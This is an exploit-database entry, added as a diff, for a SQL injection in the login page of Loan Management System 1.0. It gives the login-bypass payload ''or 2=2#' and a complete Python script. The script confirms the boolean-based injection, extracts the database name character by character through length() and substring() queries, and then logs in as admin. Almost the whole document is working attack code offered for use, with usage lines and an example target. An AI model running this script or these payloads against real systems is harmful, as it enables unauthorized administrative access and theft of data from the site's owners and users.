@@ -1,0 +1,148 @@
+id: 37866
+date: 07/31/2022
+title: Loan Management System 1.0 SQL Injection Vulnerability
+author: saitamang
+cves: 
+
+# Exploit Title: Loan Management System - SQL Injection via login page
+# Exploit Author: saitamang
+# Vendor Homepage: sourcecodester
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/razormist/LMS.zip
+# Version: 1.0
+# Tested on: Centos 7 apache2 + MySQL
+
+# The attack vector for the SQL Injection happened at the login page. The login can be bypass using the boolean payload below to gain access as Admin as the highest privileges.
+
+# Payload --> 'or 2=2#
+
+# The python script to get the database name from SQL Injection Vulnerability can be execute below.
+
+import requests, string, sys, warnings, time, concurrent.futures
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+warnings.simplefilter('ignore',InsecureRequestWarning)
+
+dbname = ''
+
+req = requests.Session()
+
+def login(ip,username,password):  
+    target = "http://%s/LMS/login.php" %ip
+
+    data = {'username': username,'password':password, 'login':''}
+    response = req.post(target, data=data)
+
+    if 'Login Successful' in response.text:
+        print("[$] Success Login with credentials "+username+":"+password+"")
+    else:
+        print("[$] Failed Login with credentials "+username+":"+password+"")
+
+def check_injection():
+    # library inj
+    test_query0 = "'or 1=2#"
+    test_query1 = "'or 2=2#"
+
+    target = "http://%s/LMS/login.php" %ip
+
+    result = ""
+
+    for i in range(2):
+
+        if i==0:
+            data = {'username': test_query0,'password':password, 'login':''}
+            response = req.post(target, data=data)
+            if response.text=="success":
+                result = response.text
+            else:
+                pass
+        if i==1:
+            data = {'username': test_query1,'password':password, 'login':''}
+            response = req.post(target, data=data)
+            if response.text=="success":
+                result = response.text
+            else:
+                pass
+    if result=="<script>alert('Login Successful')</script><script>window.location='home.php'</script>":
+        print("[##] SQLI Boolean-Based Present at password field :)")
+    else:
+        print("[##] No SQLI :)")
+
+def brute(dbname,password):
+    target = "http://%s/LMS/login.php" %ip
+
+    l=0
+
+    # checking length of dbname star with i = 1
+    for i in (n+1 for n in range(9)):
+
+        payload = "'or 2=2 and length(database())='"+ str(i) +"'#"
+        #print(payload)
+    
+        data = {'username': payload,'password':password, 'login':''}
+        response = req.post(target, data=data)
+        result = response.text
+        #print(result)
+
+        if result=="<script>alert('Login Successful')</script><script>window.location='home.php'</script>":
+            print("[##] The correct length of DB name is "+str(i))
+            l=i
+            break
+        else:
+            print("[##] The length of DB name "+str(i)+" is wrong")
+            pass
+
+    char = [char for char in string.ascii_lowercase]
+    char.append('_')
+    #print(char)
+    dbname = []
+
+    for i in range(l):
+        for j in char:
+            payload = "'or 2=2 and substring(database()," + str(i+1) + ",1)='" + str(j) +"'#"
+            
+            data = {'username': payload,'password':password, 'login':''}
+            response = req.post(target, data=data)
+            result = response.text
+            #print(payload)
+            #print(result)
+
+            if result=="<script>alert('Login Successful')</script><script>window.location='home.php'</script>":
+                dbname.append(j)
+                print("[+] The " + str(i+1) + " char of DB name is "+str(j))
+                break
+            else:
+                pass
+
+    dbname = ''.join(dbname)
+    
+    print("[+] Database name retrieved --> "+dbname)
+    print("[+] Bypass completed :)")
+    print("[+] Bypass payload can be used is \n'or 2=2#")
+
+    username = "'or 2=2#"
+
+    print("\nRetry to login with new payload in password field")
+    login(ip,username,password)
+
+if __name__ == "__main__":
+    print("   _____       _ __                                   ")
+    print("  / ___/____ _(_) /_____ _____ ___  ____ _____  ____ _")
+    print("  \__ \/ __ `/ / __/ __ `/ __ `__ \/ __ `/ __ \/ __ `/")
+    print(" ___/ / /_/ / / /_/ /_/ / / / / / / /_/ / / / / /_/ / ")
+    print("/____/\__,_/_/\__/\__,_/_/ /_/ /_/\__,_/_/ /_/\__, /  ")
+    print("                                             /____/   \n\n")
+
+    try:
+        ip = sys.argv[1].strip()
+        username = sys.argv[2].strip()
+        password = sys.argv[3].strip()
+
+        login(ip,username,password)
+        check_injection()
+        brute(dbname,password)
+        
+    except IndexError:
+        print("[-] Usage %s <ip> <username> <password>" % sys.argv[0])
+        print("[-] Example: %s 192.168.149.130 admin admin123" % sys.argv[0])
+    sys.exit(-1)
+
+#  0day.today [2023-03-24]  #
